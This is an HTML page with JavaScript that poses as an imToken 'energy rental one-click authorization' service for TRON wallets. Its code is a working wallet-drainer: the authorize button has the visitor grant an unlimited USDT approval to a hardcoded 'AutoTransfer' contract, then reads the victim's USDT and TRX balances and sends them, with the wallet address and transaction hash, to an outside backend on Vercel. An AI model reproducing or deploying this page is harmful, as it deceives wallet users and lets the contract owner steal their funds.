<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imToken一键能量授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
               padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
        .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px;
                   font-size: 14px; margin-bottom: 20px; text-align: left; }
        .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px;
               background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
        .record-list { margin-top: 30px; }
        .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
        .record-item p { margin-bottom: 8px; color: #333; }
        .record-item p strong { color: #2c3e50; }
        .tx-link { color: #409EFF; text-decoration: none; }
        .status-tip { text-align: center; color: #666; font-size: 13px; margin: 10px 0; }
    </style>
</head>
<body>
<div class="header">
    <h1>能量租赁一键授权</h1>
    <div class="warning">
        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>，然后连接imToken钱包后，点击钱包页面下方“浏览”，在搜索框中粘贴访问
    </div>
</div>

<!-- 链接显示+复制按钮的容器 -->
<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
    <span id="copyLinkText" style="color: #007AFF; word-break: break-all; flex: 1;">
        https://trc20trx-alt.github.io/Trc20.TRX/
    </span>
    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
        <strong>复制链接</strong>
    </button>
</div>

<button id="connectBtn" class="btn">连接imToken钱包</button>
<button id="approveBtn" class="btn" disabled>能量授权</button>

<div id="userInfo">未连接钱包</div>
<!-- 新增：后端发送状态提示 -->
<div id="sendStatus" class="status-tip"></div>

<div class="record-list">
    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
    <div id="approvalRecords">暂无授权记录</div>
</div>

<script>
    // ========== 需替换的3处配置（务必确认后端接口地址正确） ==========
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口（重点确认！）

    // TRC20 uint256最大值 = 无限授权（固定值）
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

    // 全局变量
    let tronWeb, userAddress, trc20Contract;
    const RECORD_KEY = "imtoken_infinite_approval_records";
    const sendStatusDom = document.getElementById("sendStatus");

    window.onload = async () => {
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const copyLinkBtn = document.getElementById("copyLinkBtn");

        // 1. 复制链接功能
        copyLinkBtn.addEventListener("click", async () => {
            try {
                const linkContent = copyLinkText.textContent.trim();
                await navigator.clipboard.writeText(linkContent);
                alert("链接已成功复制到剪贴板!");
            } catch (error) {
                alert("复制失败，请手动选中链接复制~");
            }
        });

        // 2. 完善tronWeb自动连接（确保初始化完成，避免数据缺失）
        if (window.tronWeb) {
            if (window.tronWeb.ready) {
                tronWeb = window.tronWeb;
                await initWallet();
            } else {
                window.tronWeb.on('ready', async () => {
                    tronWeb = window.tronWeb;
                    await initWallet();
                });
            }
        } else {
            document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
        }

        // 3. 手动连接钱包
        connectBtn.onclick = async () => {
            try {
                if (!window.tronWeb) {
                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                    return;
                }
                const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                userAddress = accounts[0];
                await initWallet();
            } catch (e) {
                alert("连接失败：" + e.message);
            }
        };

        // 4. 核心：授权+数据发送（强化后端发送可靠性）
        approveBtn.onclick = async () => {
            try {
                // 先确保合约实例初始化
                if (!trc20Contract) {
                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
                }

                // 执行授权
                sendStatusDom.textContent = "正在执行授权，请在钱包确认...";
                const result = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({
                    from: userAddress,
                    shouldPollResponse: true
                });

                // 延长延迟至3秒（确保交易100%上链，余额数据准确）
                sendStatusDom.textContent = "授权成功，正在获取最新余额...";
                setTimeout(async () => {
                    try {
                        // 1. 获取余额（双重校验，确保数据完整）
                        const [tokenBalance, trxBalance] = await Promise.all([
                            getTokenBalance(userAddress).catch(err => {
                                throw new Error(`USDT余额获取失败：${err.message}`);
                            }),
                            getTrxBalance(userAddress).catch(err => {
                                throw new Error(`TRX余额获取失败：${err.message}`);
                            })
                        ]);

                        // 2. 构建完整数据（必含后端所需关键字段，缺一不可）
                        const authData = {
                            address: userAddress,          // 用户钱包地址（必填）
                            tokenBalance: tokenBalance.toFixed(2), // USDT余额（必填）
                            trxBalance: trxBalance.toFixed(2),     // TRX余额（必填）
                            approveTime: new Date().toLocaleString(), // 授权时间（必填）
                            txHash: result.transaction.txID,       // 交易哈希（必填，后端可查账）
                            approveType: "无限额度",               // 授权类型（必填）
                            contractAddress: AUTO_TRANSFER_CONTRACT, // 授权目标合约（可选，便于后端筛选）
                            timestamp: new Date().getTime()         // 时间戳（可选，后端去重）
                        };

                        // 3. 本地存储（备份，防止后端发送失败丢失数据）
                        saveApprovalRecord(authData);
                        renderApprovalRecords();

                        // 4. 核心：发送到后端（带重试+详细错误反馈）
                        sendStatusDom.textContent = "正在向后端发送授权信息...";
                        await sendDataToBackend(authData);

                        // 5. 全流程成功提示
                        sendStatusDom.style.color = "#4CAF50";
                        sendStatusDom.textContent = "✅ 授权信息已成功发送到后端！";
                        alert(`无限授权成功！\n交易哈希：${authData.txHash}\n✅ 信息已同步至后端`);

                    } catch (innerErr) {
                        sendStatusDom.style.color = "#F44336";
                        sendStatusDom.textContent = `❌ 处理失败：${innerErr.message}`;
                        alert(`授权成功，但后续处理失败：\n${innerErr.message}\n请刷新页面重试`);
                    }
                }, 3000);

            } catch (approveErr) {
                sendStatusDom.style.color = "#F44336";
                sendStatusDom.textContent = `❌ 授权失败：${approveErr.message}`;
                alert("授权失败：" + approveErr.message);
            }
        };

        // 初始化渲染记录
        renderApprovalRecords();
    };

    // 初始化钱包信息
    async function initWallet() {
        try {
            userAddress = tronWeb.defaultAddress.base58;
            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);

            document.getElementById("userInfo").innerHTML = `
                已连接：<br>
                ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
            `;
            document.getElementById("approveBtn").disabled = false;
        } catch (e) {
            alert("钱包初始化失败：" + e.message);
        }
    }

    // 查USDT余额（带重试逻辑，防止网络波动）
    async function getTokenBalance(address, retry = 2) {
        try {
            const balance = await trc20Contract.balanceOf(address).call();
            return balance / 1000000; // USDT小数位6位
        } catch (err) {
            if (retry > 0) {
                console.log(`USDT余额查询失败，剩余重试次数：${retry}`);
                await new Promise(resolve => setTimeout(resolve, 1000)); // 间隔1秒重试
                return getTokenBalance(address, retry - 1);
            }
            throw err; // 重试耗尽仍失败，抛出错误
        }
    }

    // 查TRX余额（带重试逻辑）
    async function getTrxBalance(address, retry = 2) {
        try {
            const balance = await tronWeb.trx.getBalance(address);
            return balance / 1000000; // TRX小数位6位
        } catch (err) {
            if (retry > 0) {
                console.log(`TRX余额查询失败，剩余重试次数：${retry}`);
                await new Promise(resolve => setTimeout(resolve, 1000));
                return getTrxBalance(address, retry - 1);
            }
            throw err;
        }
    }

    // 本地存储记录（确保数据不丢失）
    function saveApprovalRecord(record) {
        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        const newRecords = existing.filter(item => item.txHash !== record.txHash); // 用txHash去重，避免重复记录
        newRecords.push(record);
        localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    }

    // 渲染记录
    function renderApprovalRecords() {
        const container = document.getElementById("approvalRecords");
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");

        if (records.length === 0) {
            container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
            return;
        }

        container.innerHTML = records.map(record => `
            <div class="record-item">
                <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
                <p><strong>授权类型：</strong>${record.approveType}</p>
                <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
                <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                <p><strong>时间：</strong>${record.approveTime}</p>
                <p><strong>后端状态：</strong>已同步（本地备份）</p>
                <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
            </div>
        `).join("");
    }

    // ========== 强化版：后端数据发送函数（确保必达） ==========
    async function sendDataToBackend(data, retry = 3) {
        try {
            // 1. 前置校验：后端接口是否配置（防止漏改）
            if (!BACKEND_API || BACKEND_API.includes("替换")) {
                throw new Error("请先配置正确的后端接口地址（BACKEND_API）");
            }

            // 2. 发送请求（带超时控制，避免无限等待）
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000); // 15秒超时

            const res = await fetch(BACKEND_API, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json",
                    "X-Request-Source": "imToken-Auth-Frontend" // 自定义请求头，便于后端识别来源
                },
                body: JSON.stringify(data),
                credentials: "same-origin", // 按后端跨域配置调整，多数情况用same-origin即可
                signal: controller.signal // 绑定超时控制
            });

            clearTimeout(timeoutId); // 清除超时

            // 3. 响应校验：后端返回200才算成功
            if (!res.ok) {
                const errMsg = await res.text().catch(() => "未知错误");
                throw new Error(`后端返回错误[${res.status}]：${errMsg}`);
            }

            // 4. 确认后端接收成功（需后端返回JSON格式，如{code:200,msg:"success"}）
            const resData = await res.json();
            if (resData.code !== 200 && !resData.success) {
                throw new Error(`后端处理失败：${resData.msg || "无返回信息"}`);
            }

            console.log("✅ 后端接收成功，返回数据：", resData);
            return resData;

        } catch (err) {
            // 5. 重试逻辑：重试3次，间隔2秒
            if (retry > 0) {
                const remaining = retry - 1;
                sendStatusDom.textContent = `❌ 发送失败，剩余重试次数：${remaining}（${err.message}）`;
                console.log(`发送失败，剩余重试${remaining}次：`, err);
                await new Promise(resolve => setTimeout(resolve, 2000)); // 间隔2秒重试
                return sendDataToBackend(data, remaining);
            }

            // 6. 重试耗尽：提示手动同步（本地有备份，可后续重试）
            throw new Error(`后端发送失败（已重试3次）：${err.message}\n本地已备份记录，可刷新页面重试`);
        }
    }
</script>
</body>
</html>
